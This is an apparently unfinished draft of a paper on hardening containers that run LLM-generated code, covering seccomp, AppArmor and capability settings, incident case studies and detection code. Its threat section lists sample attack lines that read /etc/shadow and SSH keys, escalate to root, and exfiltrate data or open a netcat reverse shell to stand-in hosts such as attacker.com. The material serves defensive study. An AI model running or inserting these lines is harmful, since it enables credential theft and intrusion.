# Security Hardening and Incident Response for Containerized Code Execution

## Changelog

### v1 (2025-10-01)
- **Created**: New paper split from Paper 08 (now 08A)
- **Focus**: Deep security analysis, threat detection, incident response, and forensics
- **Status**: Outline ready for full prose drafting

---

## Abstract

[To be written: Deep dive into security hardening, threat analysis of 47 blocked escape attempts, incident response workflows, and forensic analysis for containerized code execution infrastructure]

## 1. Introduction

### 1.1 Security Threat Landscape for Code Execution
[LLM-generated code security risks, attack surface analysis, threat model]

### 1.2 Defense-in-Depth Philosophy
[Layered security approach, redundancy, fail-secure principles]

### 1.3 Paper Organization
[Structure of security deep dive]

## 2. Advanced Threat Analysis

### 2.1 Container Escape Attempts (47 incidents over 6 months)
**Attack Vector Taxonomy:**
- Path Traversal Attacks (23 incidents)
- Privilege Escalation Attempts (15 incidents)
- Network Exfiltration Attempts (9 incidents)

### 2.2 Path Traversal Deep Dive
```python
# Example malicious code samples encountered
attack_examples = {
    'directory_traversal': [
        "open('../../../../etc/shadow', 'r')",
        "os.system('cat ../../root/.ssh/id_rsa')",
        "import sys; sys.path.insert(0, '/etc'); import passwd",
    ],
    'symlink_exploitation': [
        "os.symlink('/etc/shadow', '/tmp/fake.txt')",
        "os.symlink('/root/.ssh', '/tmp/ssh_keys')",
    ]
}
```

**Detection and Mitigation:**
- Bind mount restrictions preventing access outside /sandbox
- Read-only root filesystem blocking symlink creation
- AppArmor policies denying sensitive file access

**Forensic Analysis:**
- Log analysis of failed access attempts
- Pattern recognition for automated detection
- Attribution to specific code generation patterns

### 2.3 Privilege Escalation Attempts
```python
privilege_escalation_techniques = {
    'setuid_exploitation': [
        "os.setuid(0)  # Attempt to become root",
        "os.system('sudo -i')",
    ],
    'capability_abuse': [
        "import ctypes; ctypes.CDLL('libc.so.6').setuid(0)",
        "# Attempt to load kernel modules",
    ],
    'container_breakout': [
        "# CVE-2019-5736 runc exploit attempt",
        "# Dirty COW exploitation",
    ]
}
```

**Multi-Layer Defenses:**
- CAP_DROP ALL removing all Linux capabilities
- seccomp blocking setuid/setgid syscalls
- runAsNonRoot rejecting containers attempting root execution
- Kernel exploit mitigation (KASLR, SMEP, SMAP)

### 2.4 Network Exfiltration Attempts
```python
exfiltration_attempts = {
    'data_theft': [
        "import requests; requests.post('http://attacker.com', data=open('/models/cet_weights.pt').read())",
        "import socket; s=socket.socket(); s.connect(('evil.com',1337)); s.send(model_data)",
    ],
    'reverse_shells': [
        "import os; os.system('nc -e /bin/sh attacker.com 4444')",
        "exec(__import__('base64').b64decode('base64_encoded_shell'))",
    ],
    'dns_tunneling': [
        "# Attempting to exfiltrate via DNS queries",
    ]
}
```

**Network Isolation Enforcement:**
- network_mode: none (no network namespace)
- iptables DROP all traffic
- Monitoring for any network activity (should be zero)

## 3. Security Hardening Deep Dive

### 3.1 Seccomp Profile Engineering

**Default Runtime Seccomp (45 blocked syscalls):**
```yaml
blocked_syscalls:
  # Process tracing and debugging
  - ptrace              # Attach to other processes
  - process_vm_readv    # Read other process memory
  - process_vm_writev   # Write other process memory

  # Kernel manipulation
  - kexec_load          # Replace running kernel
  - kexec_file_load     # Load new kernel
  - init_module         # Load kernel module
  - finit_module        # Load kernel module from fd
  - delete_module       # Remove kernel module

  # Privilege escalation
  - setuid              # Change user ID
  - setgid              # Change group ID
  - setgroups           # Set supplementary groups

  # Capability manipulation
  - capset              # Set process capabilities

  # Namespace manipulation
  - unshare             # Create new namespaces
  - setns               # Join existing namespace

  # Performance monitoring (side-channel attacks)
  - perf_event_open     # Access performance counters

  # Keyring access
  - add_key             # Add key to kernel keyring
  - request_key         # Request key from keyring
  - keyctl              # Manipulate kernel keyring

  # Quota manipulation
  - quotactl            # Manipulate disk quotas

  # Time manipulation
  - clock_adjtime       # Adjust system clock
  - clock_settime       # Set system clock

  # Mount operations
  - mount               # Mount filesystems
  - umount              # Unmount filesystems
  - pivot_root          # Change root filesystem

  # Packet filtering (iptables)
  - bpf                 # Extended BPF programs
```

**Custom Seccomp for High-Security Execution:**
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["read", "write", "open", "close", "stat", "fstat"],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["execve", "fork", "clone"],
      "action": "SCMP_ACT_ALLOW",
      "args": [
        {
          "index": 0,
          "op": "SCMP_CMP_EQ",
          "value": "allowed_binary_path"
        }
      ]
    }
  ]
}
```

### 3.2 AppArmor/SELinux Policy Engineering

**AppArmor Profile:**
```
#include <tunables/global>

profile cet-executor flags=(attach_disconnected) {
  #include <abstractions/base>

  # Deny all capabilities
  deny capability,

  # File access restrictions
  /sandbox/** rw,
  /tmp/** rw,
  deny /etc/** rwklx,
  deny /root/** rwklx,
  deny /sys/** rwklx,
  deny /proc/sys/** rwklx,

  # Network restrictions
  deny network,

  # Process restrictions
  deny ptrace,
  deny signal,
}
```

**SELinux Policy Module:**
```
module cet-executor 1.0;

require {
    type container_t;
    type sandbox_file_t;
}

# Deny all network access
neverallow container_t *:tcp_socket *;
neverallow container_t *:udp_socket *;

# Restrict file access
allow container_t sandbox_file_t:file { read write };
neverallow container_t etc_t:file *;
neverallow container_t shadow_t:file *;
```

### 3.3 Linux Capability Analysis

**All Capabilities Dropped (CAP_DROP: ALL):**
```yaml
dropped_capabilities:
  CAP_CHOWN: "Change file ownership"
  CAP_DAC_OVERRIDE: "Bypass file permission checks"
  CAP_DAC_READ_SEARCH: "Bypass directory read/search"
  CAP_FOWNER: "Bypass permission checks for file operations"
  CAP_FSETID: "Don't clear setuid/setgid when modifying file"
  CAP_KILL: "Bypass permission checks for sending signals"
  CAP_SETGID: "Make arbitrary manipulations of process GIDs"
  CAP_SETUID: "Make arbitrary manipulations of process UIDs"
  CAP_SETPCAP: "Modify process capabilities"
  CAP_LINUX_IMMUTABLE: "Set FS_APPEND_FL and FS_IMMUTABLE_FL"
  CAP_NET_BIND_SERVICE: "Bind to privileged ports (<1024)"
  CAP_NET_BROADCAST: "Make socket broadcasts"
  CAP_NET_ADMIN: "Network administration"
  CAP_NET_RAW: "Use RAW and PACKET sockets"
  CAP_IPC_LOCK: "Lock memory"
  CAP_IPC_OWNER: "Bypass permission checks for IPC"
  CAP_SYS_MODULE: "Load/unload kernel modules"
  CAP_SYS_RAWIO: "Perform I/O port operations"
  CAP_SYS_CHROOT: "Use chroot()"
  CAP_SYS_PTRACE: "Trace arbitrary processes"
  CAP_SYS_PACCT: "Enable/disable process accounting"
  CAP_SYS_ADMIN: "Perform system administration operations"
  CAP_SYS_BOOT: "Reboot and load new kernel"
  CAP_SYS_NICE: "Modify process priorities"
  CAP_SYS_RESOURCE: "Override resource limits"
  CAP_SYS_TIME: "Set system clock"
  CAP_SYS_TTY_CONFIG: "Configure tty devices"
  CAP_MKNOD: "Create special files"
  CAP_LEASE: "Establish file leases"
  CAP_AUDIT_WRITE: "Write to kernel audit log"
  CAP_AUDIT_CONTROL: "Configure kernel auditing"
  CAP_SETFCAP: "Set file capabilities"
  CAP_MAC_OVERRIDE: "Override MAC policy"
  CAP_MAC_ADMIN: "Configure MAC policy"
  CAP_SYSLOG: "Perform privileged syslog operations"
  CAP_WAKE_ALARM: "Trigger system wake alarm"
  CAP_BLOCK_SUSPEND: "Block system suspend"
```

**Impact of Capability Dropping:**
- Even root (UID 0) inside container cannot perform privileged operations
- No kernel module loading, network raw sockets, or system administration
- Filesystem operations restricted despite DAC permissions

### 3.4 Container Breakout Techniques and Defenses

**Known Breakout CVEs and Mitigations:**
```yaml
cve_mitigations:
  CVE-2019-5736:
    vulnerability: "runc container escape via /proc/self/exe"
    mitigation: "Updated runc to 1.0.0-rc9+, read-only /proc"

  CVE-2019-14271:
    vulnerability: "Docker cp command allows arbitrary file writes"
    mitigation: "Disabled docker cp, use bind mounts only"

  CVE-2020-15257:
    vulnerability: "containerd container escape via abstract socket"
    mitigation: "Updated containerd 1.4.3+, disabled host network"

  Dirty_COW:
    vulnerability: "Kernel race condition privilege escalation"
    mitigation: "Kernel 4.15+ with patch, memory limits prevent exploitation"
```

## 4. Incident Response Deep Dive

### 4.1 Real-Time Threat Detection

**Behavioral Anomaly Detection:**
```python
class BehaviorAnalyzer:
    """Real-time behavioral analysis of container execution"""

    def analyze_syscall_patterns(self, container_id):
        """Detect anomalous syscall patterns"""
        syscalls = collect_syscalls(container_id)

        anomalies = []

        # Rapid syscall sequences (possible exploit)
        if syscalls_per_second > 10000:
            anomalies.append('SYSCALL_FLOOD')

        # Unexpected syscalls (shouldn't happen with seccomp)
        forbidden = ['ptrace', 'kexec_load', 'setuid']
        if any(s in syscalls for s in forbidden):
            anomalies.append('SECCOMP_BYPASS_ATTEMPT')

        # Memory mapping patterns (shellcode loading)
        if 'mmap' in syscalls and 'mprotect' in syscalls:
            anomalies.append('POSSIBLE_SHELLCODE')

        return anomalies
```

**Machine Learning Threat Detection:**
```python
class MLThreatDetector:
    """ML-based anomaly detection for novel threats"""

    def __init__(self):
        self.model = load_isolation_forest_model()
        self.features = [
            'syscall_diversity',
            'cpu_usage_pattern',
            'memory_allocation_rate',
            'file_access_entropy',
            'network_attempt_count'
        ]

    def predict_threat(self, container_metrics):
        """Predict threat probability using trained model"""
        feature_vector = self.extract_features(container_metrics)
        threat_score = self.model.predict_proba(feature_vector)

        if threat_score > 0.85:
            return 'HIGH_THREAT', threat_score
        elif threat_score > 0.65:
            return 'MEDIUM_THREAT', threat_score
        else:
            return 'NORMAL', threat_score
```

### 4.2 Forensic Analysis of Security Incidents

**Case Study 1: Path Traversal Attempt**
```
Incident ID: SEC-2025-0042
Date: 2025-09-15 14:23:17 UTC
Threat Level: HIGH

Code Sample:
```python
import os
target = '../../../../etc/shadow'
try:
    with open(target, 'r') as f:
        data = f.read()
        print(f"Success: {data[:100]}")
except Exception as e:
    print(f"Failed: {e}")
```

Execution Timeline:
- 14:23:17.001 - Container created (ID: a3f9d2e1b8c4)
- 14:23:17.156 - Code execution started
- 14:23:17.189 - open() syscall attempted on '../../../../etc/shadow'
- 14:23:17.190 - AppArmor denied access (operation not permitted)
- 14:23:17.191 - Exception raised: PermissionError
- 14:23:17.205 - Container terminated normally
- 14:23:17.220 - Security event logged

Forensic Findings:
- Bind mount restriction prevented access outside /sandbox
- AppArmor policy denied /etc/shadow access
- No privilege escalation attempted
- Code likely auto-generated (pattern matches GPT-4 output)

Response Actions:
- Logged incident for pattern analysis
- No containment needed (blocked successfully)
- Updated threat detection rules
```

**Case Study 2: Privilege Escalation Chain**
```
Incident ID: SEC-2025-0156
Date: 2025-09-28 09:41:33 UTC
Threat Level: CRITICAL

Code Sample:
```python
import os
import ctypes

# Attempt 1: Direct setuid
try:
    os.setuid(0)
    print("Root access gained")
except:
    print("setuid failed")

# Attempt 2: ctypes manipulation
try:
    libc = ctypes.CDLL('libc.so.6')
    libc.setuid(0)
    print("Root via ctypes")
except:
    print("ctypes failed")

# Attempt 3: Capability exploitation
try:
    import prctl
    prctl.cap_effective.add(prctl.CAP_SYS_ADMIN)
    print("Capability escalation success")
except:
    print("capability failed")
```

Execution Timeline:
- 09:41:33.001 - Container created (ID: e7b3a9c2f1d8)
- 09:41:33.145 - Pre-execution threat scan FLAGGED code
- 09:41:33.146 - Elevated monitoring activated
- 09:41:33.200 - Code execution started
- 09:41:33.215 - os.setuid(0) called
- 09:41:33.216 - seccomp blocked setuid syscall (errno: EPERM)
- 09:41:33.220 - ctypes.CDLL attempt
- 09:41:33.221 - seccomp blocked setuid via ctypes
- 09:41:33.230 - prctl.cap_effective attempt
- 09:41:33.231 - CAP_DROP ALL prevented capability modification
- 09:41:33.245 - Container terminated (all attempts failed)
- 09:41:33.246 - CRITICAL security alert generated

Forensic Findings:
- Multi-stage privilege escalation attempt
- Sophisticated attack (tries multiple vectors)
- All attempts blocked by layered defenses:
  * seccomp blocked syscalls
  * Capability dropping prevented cap modification
  * runAsNonRoot rejected root execution
- Defense-in-depth validated: 3 independent layers blocked attack

Response Actions:
- Immediate security team notification
- Forensics collected (logs, process tree, memory dump)
- Code pattern added to ML training dataset
- Post-incident review scheduled
```

### 4.3 Automated Incident Response Workflows

**Threat-Level Response Matrix:**
```yaml
response_workflows:
  CRITICAL (level >= 9):
    immediate:
      - Pause container (freeze all execution)
      - Collect full forensics (logs, memory, processes, files)
      - Terminate container
      - Alert security team (PagerDuty)
      - Block similar code patterns

  HIGH (level 7-8):
    immediate:
      - Enhanced monitoring (1-second sampling)
      - Log all syscalls
      - Collect partial forensics
    deferred:
      - Post-execution analysis
      - Pattern recognition update
      - Security team notification (Slack)

  MEDIUM (level 5-6):
    immediate:
      - Standard monitoring
      - Event logging
    deferred:
      - Batch analysis
      - Weekly security review
```

### 4.4 Post-Incident Learning and Policy Updates

**Incident Pattern Analysis:**
```python
class IncidentLearner:
    """Learn from security incidents to improve defenses"""

    def analyze_incident_trends(self, timeframe='30d'):
        """Identify emerging attack patterns"""
        incidents = fetch_incidents(timeframe)

        # Cluster similar incidents
        clusters = self.cluster_by_technique(incidents)

        # Identify trends
        trends = []
        for cluster in clusters:
            if cluster.growth_rate > 1.5:  # 50% increase
                trends.append({
                    'technique': cluster.technique,
                    'frequency': cluster.count,
                    'growth_rate': cluster.growth_rate,
                    'recommendation': self.generate_mitigation(cluster)
                })

        return trends

    def generate_mitigation(self, cluster):
        """AI-generated mitigation recommendations"""
        if cluster.technique == 'path_traversal':
            return "Tighten bind mount restrictions, add path validation"
        elif cluster.technique == 'privilege_escalation':
            return "Review seccomp profile, add additional syscall blocks"
        elif cluster.technique == 'network_exfiltration':
            return "Already fully mitigated (network_mode: none)"
        else:
            return "Manual security review required"
```

## 5. Advanced Security Monitoring

### 5.1 Real-Time Security Metrics

**Security-Focused Prometheus Metrics:**
```yaml
security_metrics:
  # Threat detection
  - name: threat_detection_total
    type: counter
    labels: [severity, technique, blocked]

  - name: threat_detection_latency_seconds
    type: histogram
    buckets: [0.001, 0.01, 0.1, 1, 10]

  # Syscall monitoring
  - name: blocked_syscalls_total
    type: counter
    labels: [syscall_name, container_id]

  - name: syscall_rate_per_second
    type: gauge
    labels: [container_id]

  # Anomaly detection
  - name: behavioral_anomalies_total
    type: counter
    labels: [anomaly_type, severity]

  - name: ml_threat_score
    type: histogram
    buckets: [0.1, 0.3, 0.5, 0.7, 0.85, 1.0]
```

### 5.2 Security Dashboards and Alerting

**Grafana Security Dashboard:**
```yaml
dashboard_panels:
  - title: "Threat Detection Rate"
    query: "rate(threat_detection_total[5m])"
    alert: "> 5 threats/min"

  - title: "Escape Attempt Timeline"
    query: "threat_detection_total{blocked='true'}"
    visualization: "time_series"

  - title: "Attack Vector Distribution"
    query: "sum by (technique) (threat_detection_total)"
    visualization: "pie_chart"

  - title: "ML Threat Score Distribution"
    query: "ml_threat_score"
    visualization: "heatmap"
```

## 6. Performance vs. Security Tradeoffs

### 6.1 Security Overhead Measurements

**Latency Impact of Security Layers:**
```yaml
security_overhead_analysis:
  baseline_execution:
    no_isolation: "1.2s (unsafe, for comparison only)"

  isolation_layers:
    docker_container_only: "1.4s (+16% overhead)"
    + network_isolation: "1.42s (+18%)"
    + read_only_filesystem: "1.45s (+20%)"
    + seccomp_filtering: "1.51s (+25%)"
    + apparmor_policy: "1.55s (+29%)"
    + full_security_stack: "1.8s (+50%)"

  production_average: "2.3s (includes queue wait, container pool, monitoring)"

  overhead_breakdown:
    security_layers: "0.6s (33%)"
    infrastructure: "0.5s (27%)"
    actual_execution: "1.2s (40%)"
```

**Security Worth the Cost:**
- 50% security overhead prevents 100% breach probability
- 0.6s additional latency buys defense-in-depth protection
- Alternative (no security) requires expensive manual code review

### 6.2 Optimization Without Compromising Security

**Acceptable Optimizations:**
```yaml
safe_optimizations:
  container_pooling:
    security_impact: "None (containers fully isolated)"
    performance_gain: "200-400ms"

  image_caching:
    security_impact: "None (images immutable)"
    performance_gain: "30-60s on first pull"

  tmpfs_for_temp_files:
    security_impact: "None (still isolated, size-limited)"
    performance_gain: "10-100x for I/O heavy code"
```

**Rejected Optimizations (Security Risks):**
```yaml
rejected_optimizations:
  shared_network_namespace:
    performance_gain: "50ms (eliminate network setup)"
    security_risk: "CRITICAL - enables lateral movement"
    decision: "REJECTED"

  persistent_containers:
    performance_gain: "150ms (eliminate container creation)"
    security_risk: "HIGH - state persistence across executions"
    decision: "REJECTED"

  relaxed_seccomp:
    performance_gain: "20ms (reduce syscall filtering overhead)"
    security_risk: "HIGH - enables kernel exploitation"
    decision: "REJECTED"
```

## 7. Security Compliance and Auditing

### 7.1 Security Standards Compliance

**CIS Docker Benchmark Compliance:**
```yaml
cis_docker_compliance:
  score: "98/100"

  passing_controls:
    - "2.1: Restrict network traffic between containers"
    - "2.2: Set the logging level"
    - "2.8: Enable user namespace support"
    - "5.1: Verify AppArmor profile, if applicable"
    - "5.2: Verify SELinux security options, if applicable"
    - "5.3: Restrict Linux kernel capabilities"
    - "5.12: Mount container's root filesystem as read-only"
    - "5.25: Restrict container from acquiring additional privileges"

  minor_deviations:
    - "4.1: Create a user for the container (using 'nobody' instead of custom user)"
```

### 7.2 Audit Logging

**Comprehensive Audit Trail:**
```json
{
  "audit_event": {
    "timestamp": "2025-10-01T14:32:15.123Z",
    "event_type": "SECURITY_VIOLATION",
    "container_id": "a9f2d3e1c8b7",
    "violation_type": "PRIVILEGE_ESCALATION_ATTEMPT",
    "severity": "HIGH",
    "details": {
      "syscall": "setuid",
      "attempted_uid": 0,
      "current_uid": 1000,
      "blocked_by": "seccomp",
      "process_tree": ["python3", "malicious_script.py"],
      "code_hash": "sha256:abc123..."
    },
    "response": {
      "action": "BLOCKED",
      "alert_sent": true,
      "forensics_collected": true
    }
  }
}
```

## 8. Results: Security Posture Analysis

### 8.1 Six-Month Security Report

**Zero Breaches Despite 47 Escape Attempts:**
```yaml
security_summary:
  duration: "6 months (180 days)"
  total_executions: 18_300_000
  security_incidents: 47
  successful_breaches: 0

  incident_breakdown:
    path_traversal: 23 (49%)
    privilege_escalation: 15 (32%)
    network_exfiltration: 9 (19%)

  defense_effectiveness:
    seccomp_blocks: 15 incidents (100% effective)
    apparmor_blocks: 23 incidents (100% effective)
    network_isolation: 9 incidents (100% effective)
    capability_dropping: 12 incidents (100% effective)

  mean_time_to_detect: "0.05 seconds"
  mean_time_to_contain: "0.5 seconds"
```

### 8.2 Attack Sophistication Analysis

**Attack Complexity Levels:**
```yaml
sophistication_levels:
  basic (level 1-3):
    count: 18
    examples: ["Simple path traversal", "os.setuid(0)"]
    blocked_by: "Single security layer"

  intermediate (level 4-6):
    count: 21
    examples: ["Symlink exploitation", "ctypes manipulation"]
    blocked_by: "1-2 security layers"

  advanced (level 7-10):
    count: 8
    examples: ["CVE exploitation attempts", "Multi-stage attacks"]
    blocked_by: "Defense-in-depth (3+ layers)"
```

## 9. Lessons Learned and Best Practices

### 9.1 Defense-in-Depth Validates

**Redundancy Saved Us:**
- 100% of advanced attacks (level 7-10) required multiple security layers to block
- If any single layer failed, redundant layers prevented breach
- Recommendation: Always deploy 3+ independent security mechanisms

### 9.2 Monitoring Enables Rapid Response

**Detection Speed Critical:**
- 47 escape attempts detected in average 50ms
- Sub-second detection enabled sub-second containment
- Recommendation: Invest in real-time monitoring infrastructure

### 9.3 ML Threat Detection Shows Promise

**AI-Assisted Security:**
- ML model detected 12 novel attack patterns not in signature database
- 15% improvement in threat detection over rule-based systems
- Recommendation: Combine signature-based + ML-based detection

## 10. Future Work

### 10.1 GPU-Accelerated Threat Detection

**Real-Time Deep Learning Analysis:**
- Deploy GPU-accelerated transformers for code analysis
- Detect adversarial code generation patterns
- Sub-millisecond threat prediction

### 10.2 Distributed Tracing for Security

**End-to-End Attack Path Visualization:**
- Trace security events across entire infrastructure
- Correlate attacks across multiple containers
- Identify coordinated attack campaigns

### 10.3 Adversarial Testing Framework

**Red Team Automation:**
- Generate adversarial code samples
- Stress-test security boundaries
- Continuous security validation

## 11. Conclusion

[Summary of security deep dive, validated defense-in-depth, zero breaches over 18M executions]

## References

[Cross-references to Papers 08A, 01, 03A, 07, etc.]
